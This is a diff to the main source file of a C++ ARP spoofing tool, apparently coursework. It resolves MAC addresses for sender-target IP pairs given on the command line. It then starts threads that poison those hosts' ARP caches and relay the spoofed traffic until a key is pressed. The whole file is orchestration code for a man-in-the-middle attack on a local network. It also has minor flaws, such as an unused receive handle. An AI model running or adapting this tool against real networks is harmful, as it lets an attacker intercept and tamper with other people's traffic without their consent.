@@ -5,7 +5,14 @@
 #include <sys/ioctl.h>
 #include <netdb.h>
 #include <string.h>
+#include <map>
 #include "attack.hpp"
+#include "attack_util.hpp"
+
+using namespace std;
+
+extern map<Ip, Mac> IpMacMap;
+extern map<Ip, Ip> ST_IP_map;
 
 int get_my_mac(char *if_name, char *dst, size_t dst_size) {
     struct ifreq s;
@@ -54,22 +61,25 @@ int main(int argc, char* argv[]) {
 	char* dev = argv[1];
 
 	pcap_t *handle;
+	pcap_t *send_handle, *recv_handle;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	char my_mac[0x100];
 	char my_ip[0x100];
-
+	
 	int pair_size;
-	pthread_t *threads;
-	spoof_th_arg **spoof_args;
 
+	pthread_t *arp_threads = NULL;
+	arp_info_st **arp_info_args = NULL;
+
+	pthread_t *spoof_threads = NULL;
 	
 	if (argc < 4 || argc % 2 != 0) {
 		usage();
 		return -1;
 	}
 
-	
 	handle = pcap_open_live(dev, PCAP_ERRBUF_SIZE, 1, 1, errbuf);
+	
 	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return -1;
@@ -85,30 +95,79 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
+	IpMacMap.insert(make_pair(Ip(my_ip), Mac(my_mac)));
+
+	/* Obtain Mac address by Ip passed by argument */
+	{
+		Mac out;
+		for(int i=2; i < argc; i++) {
+			if(IpMacMap.find(Ip(argv[i])) != IpMacMap.end())
+				continue;
+
+			ERR_CHK (
+				get_mac_by_ip,
+				(handle, Mac(my_mac), Ip(my_ip), Ip(argv[i]), &out), 
+				return -1;
+			)
+
+			//printf( "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+
+
+
+			IpMacMap.insert(make_pair(Ip(argv[i]), out));
+			if(i % 2 == 1 && ST_IP_map.find(Ip(argv[i])) == ST_IP_map.end()) {
+				ST_IP_map.insert(make_pair(Ip(argv[i-1]), Ip(argv[i])));
+				ST_IP_map.insert(make_pair(Ip(argv[i]), Ip(argv[i-1])));
+			}
+		};
+	}
+
+	send_handle = handle;
+	recv_handle = pcap_open_live(dev, PCAP_ERRBUF_SIZE, 1, 1, errbuf);
+
+	/* Get ready to run thread */
+	initialize_attack_thread(); 
+
+	/* Run arp infection for each sender-target pair */
 	pair_size = (argc-2) / 2;
-	threads = (pthread_t*)malloc(pair_size*sizeof(pthread_t));
-	spoof_args = (spoof_th_arg**)malloc(pair_size*sizeof(spoof_args[0]));
-
-
+	arp_threads = (pthread_t*)malloc(pair_size*sizeof(pthread_t));
+	arp_info_args = (arp_info_st**)malloc(pair_size*sizeof(arp_info_st));
 
 	for(int i=2; i < argc; i+=2) {
-		int idx = (i-2)/2;
-		spoof_th_arg *new_spoof_arg = (spoof_th_arg*)malloc(sizeof(spoof_th_arg));
-		new_spoof_arg->handle = handle;
-		new_spoof_arg->my_mac = Mac(my_mac);
-		new_spoof_arg->my_ip = Ip(my_ip);
-		new_spoof_arg->sender_ip = Ip(argv[i]);
-		new_spoof_arg->target_ip = Ip(argv[i+1]);
+		uint32_t idx = (i-2)/2;
+		arp_info_st *new_arg = (arp_info_st*)malloc(sizeof(arp_info_st));
+		new_arg->send_handle = handle;
+		new_arg->recv_handle = handle;
+		new_arg->my_mac = Mac(my_mac);
+		new_arg->sender_ip = Ip(argv[i]);
+		new_arg->target_ip = Ip(argv[i+1]);
+		new_arg->sender_mac = IpMacMap[new_arg->sender_ip];
+		new_arg->target_mac = IpMacMap[new_arg->target_ip];
 
-		spoof_args[idx] = new_spoof_arg;
-		pthread_create(&threads[idx], NULL, spoof_proc_th, (void*)spoof_args[idx]);
+
+		arp_info_args[idx] = new_arg;
+		pthread_create(&arp_threads[idx], NULL, arpinfect_proc, (void*)arp_info_args[idx]);
 	}
 
+
+	/* run spoof */
+	spoof_threads = (pthread_t*)malloc(pair_size*sizeof(pthread_t));
+
+	for(int i=0; i < pair_size; i++) 
+		pthread_create(&spoof_threads[i], NULL, spoof_proc, (void*)arp_info_args[i]);
+
+	printf("asdasd > \n");
+	fflush(stdout);
+	getchar();
+	/* Terminate All Attack threads */
+	terminate_attack_thread();
 	for(int i=0; i < pair_size; i++) {
-		pthread_join(threads[i], NULL);
-		free(spoof_args[i]);
+		pthread_join(spoof_threads[i], NULL);
+		pthread_join(arp_threads[i], NULL);
+		free(arp_info_args[i]);
 	}
 
-
+	free(spoof_threads);
+	free(arp_threads);
 	pcap_close(handle);
 }
